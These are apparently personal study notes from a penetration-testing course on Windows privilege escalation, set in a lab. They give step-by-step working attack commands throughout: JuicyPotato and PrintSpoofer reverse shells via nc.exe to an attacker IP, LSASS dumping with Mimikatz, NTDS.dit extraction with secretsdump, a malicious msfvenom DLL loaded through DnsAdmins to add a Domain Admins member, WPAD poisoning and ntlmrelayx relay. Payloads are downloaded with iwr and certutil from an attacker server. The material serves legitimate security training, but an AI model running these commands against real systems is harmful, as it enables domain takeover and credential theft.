
==🔴**Run WinPEAS first (if you can) to spot vectors fast → then use your notes to actually exploit whatever it found. If WinPEAS won’t run (AV/no upload), fall back to the manual commands from these modules.**==

`winpeas.exe        (or PowerUp.ps1 / Seatbelt.exe)`

Also to note:  When you find a third-party app running as a SYSTEM service, check it in two ways:

1. **Can I change or replace it?** (bad permissions) → use `accesschk` / `icacls`. This is the **Weak Permissions (Section 17)** and **Server Operators (Section 15)** attack.
2. **Does it have a known exploit?** (buggy software) → use `searchsploit`. This is the **Vulnerable Services (Section 19)** chapter.

# Section 1,2,3 

Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to `C:\Windows\Temp` because the `BUILTIN\Users` group has write access.

Compiling a tool from source does **not necessarily mean compiling it on the target**. In a client environment, you may compile it on your Attack Machine and transfer it to the target, but you must make sure the build is compatible with the target's **architecture, OS, libc version, and dependencies**. For example, if your Attack Machine has newer `glibc` than the target, a binary compiled there may fail on the target. If the target has `gcc`, `make`, and the required libraries, compiling directly on the target can be easier because it naturally matches the target environment. Otherwise, you can build the tool in a controlled environment that closely matches the target, or use a compatible/static binary.

Before doing enumeration or privilege escalation, check whether the system has **AV (Antivirus)** or **EDR (Endpoint Detection and Response)** because they can detect or block your tools and exploits. Also check **AppLocker**, which controls which programs and file types users are allowed to run. Knowing these protections helps you choose tools and techniques that are less likely to be blocked or detected.

If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right. In addition to the PATH, `set` can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an "IT Directory," which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc.

# Useful Windows & AD Tools

- **bloodyAD** → AD enumeration & abuse
- **BloodHound** → Visualize AD relationships, ACLs, privileges, and attack paths
- **NetExec** → SMB/WinRM enumeration, credentials & remote commands
- **Impacket** → Windows/AD attacks and remote execution
- **Ligolo-ng** → Pivoting into internal networks
- **Seatbelt / winPEAS / JAWS** → General Windows enumeration
- **PowerUp / SharpUp** → Windows privilege escalation
- **SessionGopher / LaZagne** → Credentials & saved sessions
- **Watson / WES-NG** → Missing patches & exploits
- **Sysinternals** → Detailed Windows enumeration
- **Snaffler** = Search accessible Windows/AD files and shares for sensitive information and credentials.

[PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) 

# Section 4 - Initial Enumeration

| Command                                                                                               | Description                                                            |
| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| `ipconfig /all`                                                                                       | What networks is this machine connected to?                            |
| `arp -a`                                                                                              | What other machines has it recently talked to?                         |
| `route print`                                                                                         | What networks can this machine reach and through which interface?      |
| `Get-MpComputerStatus`                                                                                | Check Windows Defender status.                                         |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                            | List AppLocker rules.                                                  |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | Test the AppLocker policy.                                             |
| `set`                                                                                                 | Display all environment variables.                                     |
| `systeminfo`                                                                                          | View detailed system configuration information.                        |
| `wmic qfe`                                                                                            | Get installed patches and updates.                                     |
| `Get-HotFix \| ft -AutoSize`                                                                          | Get installed patches and updates with poershell.                      |
| `wmic product get name`                                                                               | Get installed programs.                                                |
| `Get-WmiObject -Class Win32_Product \| select Name, Version`                                          | Get installed programs with powershell.                                |
| `query user`                                                                                          | Get logged-in users.                                                   |
| `echo %USERNAME%`                                                                                     | Get the current user.                                                  |
| `whoami /priv`                                                                                        | View the current user's privileges. Check with Administrative cmd too! |
| `whoami /groups`                                                                                      | View the current user's group information.                             |
| `net user`                                                                                            | Get all local system users.                                            |
| `net localgroup`                                                                                      | Get all local system groups.                                           |
| `net localgroup administrators`                                                                       | View members/details of the Administrators group.                      |
| `net accounts`                                                                                        | Get the password policy.                                               |
| `netstat -ano`                                                                                        | Display active network connections and associated PIDs.                |
| `tasklist /svc`                                                                                       | Display running processes and their services.                          |


---
---

# Section 5 - Communication with Processes

With **Active Network Connections**, use commands such as:

```cmd
netstat -ano
```

or:

```powershell
Get-NetTCPConnection
```

These show which ports and services are listening on the target. Look especially for services listening only on `127.0.0.1` or `::1`, because they are accessible only from the target itself and may be **hidden internal services** that Nmap from your Attack Machine cannot see. In contrast, `0.0.0.0` or `::` means the service is listening on **all network interfaces** and may be reachable from other machines. This helps enumeration by showing you **what services are running and which ones may be hidden from external scans**.

**Splunk Universal Forwarder** can be a privilege-escalation path when it runs as **SYSTEM** and allows unauthenticated app deployment; tools such as **SplunkWhisperer2** can be used to test/exploit this misconfiguration.  **Erlang Port `25672`** can be dangerous when weak/default cookies are used; tools such as **Erlang RCE/ARCE PoCs** can be used to test vulnerable Erlang services.

### Pipes

A **named pipe** is a communication channel that allows Windows programs or processes to exchange data with each other. During a pentest, named pipes are useful to enumerate because they have **permissions** that control who can read from or write to them. If a low-privileged user can interact with a pipe connected to a **privileged service**, it may reveal sensitive information or sometimes provide a path to **privilege escalation**. The important thing is to check **which service uses the pipe and what permissions users have on it**.

Find the pipe → check permissions → understand what service/process uses it → determine whether the permissions are actually exploitable.

| Command                                       | Description                                                   |
| --------------------------------------------- | ------------------------------------------------------------- |
| `pipelist.exe /accepteula`                    | List named pipes.                                             |
| `gci \\.\pipe\`                               | List named pipes with PowerShell.                             |
| `accesschk.exe -accepteula -w \pipe\* -v`     | This looks for named pipes where users have **write access**. |
| `accesschk.exe /accepteula \\.\Pipe\lsass -v` | Review permissions on the LSASS named pipe.                   |

#### Question

I downloaded `accesschk64.exe` to the attack box, then transferred it, in **PowerShell** I used:
`iwr http://10.10.15.190:8080/accesschk64.exe -o accesschk64.exe`, 
or in **cmd** you can use: 
`certutil -urlcache -f http://10.10.15.190:8080/accesschk64.exe accesschk64.exe`. 
Then I checked the pipe with: 
`.\accesschk64.exe /accepteula \Pipe\SQLLocal\SQLEXPRESS01 -v`, read the output, and found that **`NT SERVICE\MSSQL$SQLEXPRESS01`** was the account holding **WRITE_DAC**.

---
---

# Section 6 - Windows Privileges Overview

**Problem:** `whoami /priv` shows a privilege as **Disabled** → you have it, but can't use it yet. You must turn it ON in your current process. Windows has no built-in command for this, so use a script.

**Two scripts:**

| Script | When to use | Link |
|--------|-------------|------|
| Lee Holmes' `Enable-Privilege` | Quick, paste-and-run. Best for a locked-down/offline box, one privilege. | https://www.leeholmes.com/adjusting-token-privileges-in-powershell/ |
| PoshPrivilege module | Fuller tool (enable/disable/list). Use if you can load a module and want more features. | https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1 |


**Steps:**
1. Paste the `Enable-Privilege` function into your PowerShell session.
2. Enable the one you need, e.g. `Enable-Privilege SeBackupPrivilege`.
3. Confirm with `whoami /priv` → it should now show **Enabled**.


---
---

# Section 7 - SeImpersonate and SeAssignPrimaryToken 


Every Windows process carries a **token** that says which account runs it. The **SeImpersonate** (and **SeAssignPrimaryToken**) privilege lets a process **borrow another process's token** — so if you can grab a SYSTEM process's token, you become **NT AUTHORITY\SYSTEM**.

You usually find this privilege on **service accounts** — e.g. after you get code execution through a web shell, Jenkins, or **MSSQL (`xp_cmdshell`)**. The attack is nicknamed **"Potato"**: trick a SYSTEM process into connecting to you, then steal its token.

> **First thing to do** after landing as a service account: run `whoami /priv` and look for **SeImpersonatePrivilege** (Enabled). If it's there → easy SYSTEM.

It applies to any privilege — the rule is general:

Listed (even Disabled) = you HAVE it → it can be turned on and used.
Not listed at all = you DON'T have it → can't use it, full stop.

### Which tool to use (depends on Windows version)

| Tool             | Use when                                                |
| ---------------- | ------------------------------------------------------- |
| **JuicyPotato**  | Older Windows (before Win10 1809 / Server 2019)         |
| **PrintSpoofer** | Win10 1809 / Server 2019 and newer (JuicyPotato broken) |
| **RoguePotato**  | Also for newer builds; alternative to PrintSpoofer      |


## Steps (via MSSQL foothold example)

### 1. Connect to SQL with the creds you found

```shellsession
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

 **`-windows-auth`** = log in using a **Windows account** (domain/local user + password), not a SQL-only login. Use it when the creds are a Windows user (like `sql_dev`). **Leave it off** if you have a SQL-native login (e.g. the `sa` account) — then it's just `mssqlclient.py sa@10.129.43.30`.

### 2. Turn on command execution

```shellsession
SQL> enable_xp_cmdshell
```

(Impacket runs `RECONFIGURE` for you.)

### 3. Confirm who you are + check the privilege

```shellsession
SQL> xp_cmdshell whoami
nt service\mssql$sqlexpress01

SQL> xp_cmdshell whoami /priv
SeImpersonatePrivilege   ...   Enabled      <-- the golden ticket
```

### 4. Upload your tools

Upload `JuicyPotato.exe` (or `PrintSpoofer.exe`) **and** `nc.exe` to the target box (e.g. `c:\tools\`). these tools must run on the target, not your attack box. 

### 5. Start a listener on your attack box

```shellsession
sudo nc -lnvp 8443
```

### 6a. Exploit — JuicyPotato (old Windows)

```shellsession
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

Flags: `-l` COM listen port · `-p` program to run · `-a` its arguments · `-t *` try both token APIs.

### 6b. Exploit — PrintSpoofer (new Windows)

```shellsession
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### 7. Catch your SYSTEM shell

```shellsession
C:\Windows\system32> whoami
nt authority\system
```



---
---

# Section 8 - SeDebugPrivileges


**SeDebugPrivilege** = the right to **debug/read other programs' memory** — including system processes. By default only admins have it, but it's sometimes given to **developers**. If your user has it, you can read secrets from memory or become **SYSTEM**.

> **Tip:** when hunting for who has it, target **developer accounts** (e.g. from LinkedIn). They often get this right even without being local admin.
> **Check:** `whoami /priv` → look for **SeDebugPrivilege** (Disabled is fine — the tools use it anyway).

## Two ways to abuse it

| Goal | Method |
|------|--------|
| **Steal credentials** | Dump **LSASS** memory → read hashes/passwords with Mimikatz |
| **Become SYSTEM (RCE)** | Use a PoC to steal a SYSTEM process's token → SYSTEM shell |

---

## Way 1 — Dump LSASS for credentials

**LSASS** is the process that holds user passwords/hashes in memory. Dump it, then parse it.

### 1. Dump LSASS with ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**No tools allowed but have RDP?** Open **Task Manager → Details → right-click `lsass.exe` → Create dump file**, then copy the `.dmp` to your attack box. or `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass_PID> C:\Tools\lsass.dmp full`.
where `rundll32exe` is a built in tool.



### 2. Parse the dump with Mimikatz

```cmd
mimikatz.exe
mimikatz # log                    (saves output to a .txt — do this first)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
→ gives NTLM hashes / passwords of logged-on users (e.g. the local admin).

> **Then:** use a captured NTLM hash for a **pass-the-hash** attack to move to other machines (common when the local admin password is reused).

---

## Way 2 — Get a SYSTEM shell (RCE)

**Idea:** a process already running as SYSTEM (like `winlogon.exe`) has a SYSTEM token. With SeDebugPrivilege you can make a **new process inherit that SYSTEM process's token** → your command runs as SYSTEM. PoC: https://github.com/decoder-it/psgetsystem

### 1. Confirm you have the privilege

```powershell
whoami /priv
```

Look for **SeDebugPrivilege** in the list (Disabled is fine).

### 2. Open an elevated PowerShell (if you have RDP)

Right-click PowerShell → **Run as administrator** → enter the user's creds (e.g. `jordan`).

### 3. Transfer the PoC to the target

On your attack box host it (`python3 -m http.server 8080`), then on the target:

```powershell
iwr http://<YOUR_IP>:8080/psgetsys.ps1 -o psgetsys.ps1
```

### 4. Load the script into your session

```powershell
. .\psgetsys.ps1
```

(the `. ` at the start = dot-source, so the function loads.) load it once. Step 4 (. .\psgetsys.ps1) loads the function into your PowerShell session, and after that you can call [MyProcess]::CreateProcessFromParent(...) as many times as you want in that same window. You'd only load it again if: you close/reopen PowerShell (new session = load again), or
you open a different PowerShell window.

### 5. Find a SYSTEM process's PID

```powershell
tasklist
```

`winlogon.exe` always runs as SYSTEM — note its PID (e.g. `612`).

### 6. Run it against that PID

```powershell

[MyProcess]::CreateProcessFromParent(612,"c:\windows\system32\cmd.exe","")
```

- `612` = the SYSTEM process's PID (from step 5)
- `"c:\...\cmd.exe"` = the command/program to run
- `""` = required empty 3rd argument (PoC breaks without it)

or if you wanna **load the script and runs it in one go**, and grabs the PID automatically for your known process:

```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"c:\windows\system32\cmd.exe","")
```

→ a new **cmd.exe runs as SYSTEM**. Confirm:

```cmd
whoami
nt authority\system
```

### If you have NO RDP (only web shell / reverse shell)

You can't open a window, so make the PoC give you a shell instead. Swap the command for a reverse shell back to your box:

```powershell

[MyProcess]::CreateProcessFromParent(612,"c:\tools\nc.exe <YOUR_IP> 8443 -e cmd.exe","")
```
(start `nc -lnvp 8443` on your attack box first). Or run a command that **adds an admin user*.



---
---

# Section 9 - SeTakeOwnershipPrivilege


**SeTakeOwnershipPrivilege** = the right to **become the owner of any file/object** (files, folders, registry keys, services…). Once you own a file, you can give yourself permission to **read it** — even if you were blocked before. By default only admins have it. You might find it on a **service account** (e.g. one doing backups), or you can **grant it** to a user you control via GPO abuse ([SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)). **Use it to:** read a sensitive file you can't normally open — like `cred.txt`, an SSH key, or a KeePass `.kdbx` on a file share. ⚠️ **Destructive** — changing ownership can break apps/users. 


## Steps

### 1. Check for the privilege

```powershell
whoami /priv
```

Look for **SeTakeOwnershipPrivilege**.

- **Listed (even Disabled)** → you're good, continue.
- **Not listed at all** → you don't have it. No script helps — you need a fresh **logon** (if just granted via GPO) or you simply don't have the right.

### Enabling it — two ways (the script is just ONE option)

- **Method A — script** (need to download/upload it): enables all of the privilege manually.

  ```powershell
  Import-Module .\Enable-Privilege.ps1
  .\EnableAllTokenPrivs.ps1
  ```
  
  Script: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
  
- **Method B — built-in (recommended)**: do **nothing**. `takeown` enables the privilege itself (like robocopy does for SeBackup). Just go straight to step 2.

> **Rule:** for `takeown`, use **Method B** — no upload needed. Method A's script is only needed when abusing the privilege through custom PowerShell code.

### 2. Pick a target file + check its owner

```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

`/q` Shows who owns the file/folder (e.g. a service account). Your target: a file you **can't read** yet (e.g. `cred.txt`).

### 3. Take ownership

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
→ "now owned by user ...\htb-student".

### 4. Give yourself full access (owning ≠ reading yet)

Owning the file still may not let you read it — fix the permissions:

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
(`:F` = full control)

### 5. Read the file

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```
→ you get the secret (e.g. `root:n1X_p0wer_us3er!`). Copy it to your box if needed (e.g. to crack a KeePass db).


## When to use / files worth targeting

Use it when you **can't read a file the normal way** and other methods are blocked. Good targets:

| Type | Examples |
|------|----------|
| Config with creds | `c:\inetpub\wwwroot\web.config` |
| SAM / registry backups | `%WINDIR%\repair\sam`, `...\system`, `...\config\*.sav` |
| Credential files | `passwords.*`, `pass.*`, `creds.*`, `cred.txt` |
| Vaults / notes | KeePass `.kdbx`, OneNote, SSH keys |
| Other | scripts, config files, virtual hard disks |

---

**Core idea:** SeTakeOwnershipPrivilege = own any file → `takeown` to grab it → `icacls` to grant yourself read → `cat` the secret. Enable it first (Disabled is fine), and be careful — it's destructive.


---
---
# Section 10 - Windows Built-in Groups: Backup Operators (SeBackupPrivilege)


**SeBackupPrivilege** lets you read/copy **any file on the system** — even ones you're denied — so you can steal protected secrets, and on a Domain Controller grab **NTDS.dit** to dump every user's password hash. Check your groups: `whoami /groups`

Privileged ones to watch for: **Backup Operators, Event Log Readers, DnsAdmins, Hyper-V Administrators, Print Operators, Server Operators**.

**SeBackup** = you can **read/copy ANY file**, even ones you're blocked from — but **not** with the normal `copy`/`cat`. You must copy it the "backup" way. ⚠️ An **explicit Deny** on a file still blocks you, even with SeBackup.


## Copying files — the DLL is just ONE option

There are **two ways** to do the backup-copy. The DLL is optional — Windows' built-in tools do the same job.

- **Option A ( If you can upload or download tools on you target)— DLLs** (need to upload them): `Copy-FileSeBackupPrivilege`
- **Option B (if you cant download or upload) — built-in** (nothing to upload): `robocopy /B` (+ `diskshadow` to unlock locked files)

**Robocopy syntax:** `robocopy <source-folder> <destination-folder> <file>` , folder only, filename goes at the end as its own argument. Never put the filename in the source path.


**For the NTDS.dit attack the order is always:**

1. `diskshadow` → create `E:` (unlock NTDS.dit) — always needed, it's built-in
2. copy it → `robocopy /B` **or** `Copy-FileSeBackupPrivilege` (your choice)
3. `reg save HKLM\SYSTEM, SAM` → transfer both → `secretsdump`

### Option A setup (only if using the DLLs)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
whoami /priv              # look for SeBackupPrivilege
Get-SeBackupPrivilege     # enabled/disabled?
Set-SeBackupPrivilege     # turn it on if Disabled
```

---

## Attack 1 — Copy a protected file (normal server)

Normal `cat` is denied → copy it the backup way:

**Method A (DLL):**

```powershell

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
```

**Method B (built-in, no upload):**

```cmd
robocopy /B C:\Confidential C:\Tools\loot "2021 Contract.txt"

type "C:\Tools\loot\2021 Contract.txt"
```

→ you read a file you had no permission for. (No diskshadow needed — this file isn't locked.)

---

## Attack 2 — Dump NTDS.dit from a Domain Controller (the big win)

Backup Operators can **log in to a DC**. The file **`NTDS.dit`** holds **every user's NTLM hash** — but it's **locked**. So: make a **shadow copy** of C: (exposed as E:), then copy the unlocked version.

### Step 1 — Unlock it with diskshadow (built-in, always needed for NTDS)

```powershell
diskshadow.exe # Built into Windows already
```

Inside diskshadow, run:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Now C: is copied to **E:** (where NTDS.dit isn't locked).

In the diskshadow step there are **two different drives**, and only one needs a "can I write here?" check. The **`E:` drive** (`expose %cdrive% E:`) is not somewhere you write to — diskshadow **creates** it by mounting the shadow copy onto that letter, and you only **read** NTDS.dit from it, so you just need to pick a **drive letter that isn't already in use** (check with `Get-PSDrive -PSProvider FileSystem` or `wmic logicaldisk get name`, then choose any free one like E:, F:, or Z:). The places that **do** need write access are the **metadata file** (`set metadata C:\Windows\Temp\meta.cab`) and the **folder you copy `ntds.dit` into** afterward (e.g. `C:\Tools`) — both just need to be folders you can write to, which `C:\Windows\Temp` and `C:\Tools` usually are (and since this attack only works when you're already high-privilege, you can normally write there). You can quickly test write access with `echo test > C:\Tools\test.txt` — no error means you're good. So in short: **E: is just a free letter you pick (not a write check), and you only verify write access for the metadata path and wherever you copy ntds.dit to.**

### Step 2 — Copy NTDS.dit (either method) + the SYSTEM hive

**Method A (DLL):**

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

**Method B (built-in):**

```cmd
robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
```

Then save the SYSTEM hive (needed to decrypt):

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
reg save HKLM\SAM C:\Tools\SAM.SAV
```

**Always grab NTDS.dit AND the SYSTEM hive together.** NTDS.dit is encrypted — SYSTEM holds the boot key that decrypts it. Without SYSTEM, `secretsdump` can't read the hashes. Remember:

- Dumping **domain** hashes from a DC → **NTDS.dit + SYSTEM**. ✅ (no SAM)
- Dumping **local** hashes from a normal machine → **SAM + SYSTEM**.

### Step 3 — Extract hashes (on your attack box)

Transfer `ntds.dit` + `SYSTEM.SAV, SAV.SAV` to the attack box, then:

```shellsession
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV  SAM.SAV LOCAL
```

→ dumps all domain hashes (Administrator, krbtgt, every user). Use for **pass-the-hash** or crack with Hashcat.

You can also extract this hashes on the target with:

``` powershell
PS C:\htb> Import-Module .\DSInternals.psd1 
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM 
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

But not recommended for future enumerations.

## Question 

`robocopy /B "C:\Users\Administrator\Desktop\SeBackupPrivilege" "C:\Tools\p" flag.txt`

---
---

# Section 11 - Event Log Readers

**Event Log Readers** is a built-in Windows group that allows users to read certain Windows event logs without being administrators. One useful log is the **Security log**, where **Event ID 4688** records that a new process was created. If **command-line logging** is also enabled, the 4688 event can contain the exact command used to start that process. During a pentest, you can search these events for commands containing things like `/user`, `/password`, `/pass`, or other sensitive information, because users or administrators may accidentally put credentials directly in commands. So the idea is: **Event Log Readers = permission to read logs, 4688 = process creation, command-line logging = shows the command, and the goal is to look for useful information such as exposed credentials.**

| Step                      | Full command                                                                                                                                                                          | Description                                                                                                                                                                                                                           |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. Check membership       | `net localgroup "Event Log Readers"`                                                                                                                                                  | See if your user is in the group. If listed, you can read the Security log.                                                                                                                                                           |
| 2. Search log (built-in)  | `wevtutil qe Security /rd:true /f:text \| findstr "user"`                                                                                                                             | Query the Security log as text, newest first (`/rd:true`), and show only lines with `/user` = leaked creds.                                                                                                                           |
| 3. Search a remote box    | `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "user"`                                                                                        | Same search but on another machine (`/r:` = remote computer, `/u:` `/p:` = creds to log in with).                                                                                                                                     |
| 4. Search with PowerShell | `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | PowerShell way: find Event ID 4688 (process-creation) events whose command line contains `/user`. `Properties[8].Value` = the command-line text.                                                                                      |
| 5. Fix a cut-off password | `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*mary*' } \| ForEach-Object { $_.Properties[8].Value }`                                  | If a password shows truncated (`W1nter...`), the table trimmed it. This prints the FULL command line for one user (swap `mary`) — no cutoff., Or you can also Modify 4th number command and changing the user name to a specific one. |

**`findstr` hates patterns that start with `/`** — either drop the slash or use `/c:"..."`. Such as  (`/c:"/user"` → find the literal string **`/user`** (slash included)). The PowerShell `Select-String "/user"` doesn’t have this problem.

---
---

# Section 12 - DnsAdmins


The **DnsAdmins** group manages the Windows DNS service. That service runs as **NT AUTHORITY\SYSTEM**, and DNS can load a **custom plugin DLL**. DnsAdmins members can tell DNS to load **any DLL** (via `dnscmd`) — with **no checks on the path**. So you point it at **your malicious DLL** → when DNS restarts, your code runs as **SYSTEM** (often on a **Domain Controller** = instant Domain Admin).  DNS is very often on the **DC**, so this = full domain takeover. ⚠️ **Very destructive** — stopping/restarting DNS on a DC can break the whole domain. Get client permission + clean up after.

## Main attack — load a malicious DLL

| Step                           | Command                                                                                                  | What it does                                                                                                     |
| ------------------------------ | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| 1. Confirm membership          | `Get-ADGroupMember -Identity DnsAdmins`                                                                  | Check your user is in DnsAdmins                                                                                  |
| 2. Make the DLL (attack box)   | `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` | DLL that adds your user to **Domain Admins** (or use a reverse shell payload)                                    |
| 3. Host it (attack box)        | `python3 -m http.server 7777`                                                                            | Serve the DLL over HTTP                                                                                          |
| 4. Download to target          | `wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`                                       | Pull the DLL onto the target                                                                                     |
| 5. Tell DNS to load it         | `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`                           | Sets the `ServerLevelPluginDll` registry key to your DLL. **Use the FULL path.**                                 |
| 6. Restart DNS                 | `sc stop dns` then `sc start dns`                                                                        | DNS reloads → runs your DLL as SYSTEM. In powershell, always use `sc.exe.`                                       |
| 7. Check it worked             | `net group "Domain Admins" /dom`                                                                         | Your user should now be in Domain Admins                                                                         |
| 8. Cant access as Admin still? | `logoff` then `login` or `rdp` again or Run a new process with fresh creds: `runas /user:netadm cmd`     | Because your **current session has the OLD token** — it doesn’t know about your new Domain Admins membership yet |

> **Can you restart DNS?** DnsAdmins doesn't give this by default. Check your rights on the service:
> `wmic useraccount where name="netadm" get sid` → then `sc.exe sdshow DNS` (look for your SID with `RPWP` = start/stop). If not, wait for the server/service to restart on its own.

---

## Clean up (do from an admin console — important!)

Until the key is removed, DNS **won't start properly** for the client. Remove it and restart:

```cmd

reg query  \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters          # confirm key is there

reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

sc.exe start dns                                   # bring DNS back up

sc query dns                                       # should say RUNNING
```

---

## Other way 1 — mimilib.dll (instead of your own DLL)

Same as the main attack, but use Mimikatz's ready-made plugin `mimilib.dll` as the DLL. You edit one line to set your command.

| Step | Command / action | What it does |
|------|------------------|--------------|
| 1. Edit the source | In `mimikatz/mimilib/kdns.c`, change `system("ENTER COMMAND HERE");` to your command (e.g. a reverse shell one-liner) | Sets what runs when DNS loads the DLL |
| 2. Compile | Build `mimilib.dll` (Visual Studio) | Produces the malicious DLL |
| 3. Load it | `dnscmd.exe /config /serverlevelplugindll C:\path\mimilib.dll` | Point DNS at mimilib.dll |
| 4. Restart DNS | `sc stop dns` then `sc start dns` | Runs your command as SYSTEM |

---

## Other way 2 — WPAD record (capture hashes)

Many Windows computers are set to **automatically look for a proxy** on the network — companies use this so they **don't have to manually set proxy settings on every single machine**. Instead, each computer just asks the network "where's the proxy?" by looking up a machine called **"wpad"**, and configures itself automatically. Normally Windows **blocks** DNS from answering that "wpad" question (a built-in safety setting), so the trick doesn't work. But a **DnsAdmins** member can **turn that safety off**, then **create a "wpad" record pointing to your attack box**. Now when those computers ask "where's the proxy?", DNS answers with **your IP** — so they start routing their web traffic **through you**, and as they connect they hand over their **login info (NTLM password hashes)**, which you catch with **Responder/Inveigh** and crack or reuse. In short: you trick every WPAD-enabled machine into treating **you** as their proxy, and they leak their hashes to you.

| Step                      | Command                                                                                                                                | What it does                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| 1. Disable the block list | `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`                                              | Removes the default protection that blocks WPAD/ISATAP                              |
| 2. Add a WPAD record      | `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3` | Points `wpad` to your attack box (`10.10.14.3`)                                     |
| 3. Catch the hashes       | Run **Responder** or **Inveigh** on your attack box                                                                                    | Victims' traffic routes through you → grab NTLM hashes → crack offline or SMB-relay |

## Optional Learning for:  SMB Relay (ntlmrelayx, runs on linux) 

Instead of **cracking** a captured NTLM hash, you **relay** it — forward the victim's login straight to **another machine** to authenticate as them. If that machine has **SMB signing OFF**, you get in (dump its hashes or run commands). Tool: **Impacket's `ntlmrelayx.py`**, fed by **Responder** (e.g. via the WPAD trick). ⚠️ Only works if the target has **SMB signing OFF / not enforced**. Signing ON = relay blocked.

## Steps

| Step | Command | What it does |
|------|---------|--------------|
| 1. Find relay targets | `nxc smb 10.129.43.0/24 --gen-relay-list targets.txt` | Scans the subnet, saves only hosts **without SMB signing** (your valid targets) to `targets.txt` |
| 2. Turn off Responder's SMB/HTTP | edit `/etc/responder/Responder.conf` → set `SMB = Off` and `HTTP = Off` | Lets ntlmrelayx handle SMB/HTTP instead of Responder grabbing them |
| 3. Start Responder | `sudo responder -I tun0 -wv` | Poisons name requests / serves WPAD to capture auth |
| 4. Run the relay | `sudo ntlmrelayx.py -tf targets.txt -smb2support` | Relays captured logins to the targets → dumps their SAM hashes |

## Useful ntlmrelayx variations

| Command | What it does |
|---------|--------------|
| `sudo ntlmrelayx.py -t smb://10.129.43.20 -smb2support` | Relay to **one** host, dump its SAM hashes |
| `sudo ntlmrelayx.py -tf targets.txt -smb2support` | Relay to **many** hosts from a file |
| `sudo ntlmrelayx.py -t smb://10.129.43.20 -smb2support -c "powershell -enc <BASE64>"` | Relay + **run a command** (e.g. reverse shell / add user) |
| `sudo ntlmrelayx.py -t smb://10.129.43.20 -smb2support -i` | Relay + drop into an **interactive SMB shell** |

**Flags:** `-t` = one target · `-tf` = target file · `-smb2support` = handle SMBv2 · `-c` = command to run · `-i` = interactive shell.

---
## Inveigh (Windows) 

**What:** the Windows version of Responder. Run it when you already have a shell on a
Windows box inside the network and can't use your Linux tools. It poisons
LLMNR/NBT-NS/mDNS and captures NTLM hashes. Two versions: PowerShell and C# (.exe).

## PowerShell version (Invoke-Inveigh)
| Step | Command | What it does |
